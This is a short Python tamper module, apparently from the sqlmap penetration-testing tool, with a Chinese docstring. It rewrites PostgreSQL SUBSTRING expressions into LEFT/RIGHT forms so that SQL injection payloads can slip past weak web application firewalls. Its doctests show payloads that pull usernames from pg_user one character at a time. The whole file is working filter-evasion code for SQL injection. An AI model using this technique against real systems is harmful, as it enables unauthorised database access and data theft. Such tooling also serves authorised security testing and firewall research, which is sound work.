#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    "\n    将 PostgreSQL SUBSTRING 替换为 LEFT 和 RIGHT\n\n    测试针对：\n        * PostgreSQL 9.6.12\n\n    Note:\n        *有助于绕过过滤SUBSTRING（但不是LEFT和RIGHT）的弱Web应用程序防火墙\n\n    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')\n    'LEFT((SELECT usename FROM pg_user)::text,1)'\n    >>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')\n    'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)'\n    "

    retVal = payload

    if payload:
        match = re.search(r"SUBSTRING\((.+?)\s+FROM[^)]+(\d+)[^)]+FOR[^)]+1\)", payload)

        if match:
            pos = int(match.group(2))
            if pos == 1:
                _ = "LEFT(%s,1)" % (match.group(1))
            else:
                _ = "LEFT(RIGHT(%s,%d),1)" % (match.group(1), 1 - pos)

            retVal = retVal.replace(match.group(0), _)

    return retVal
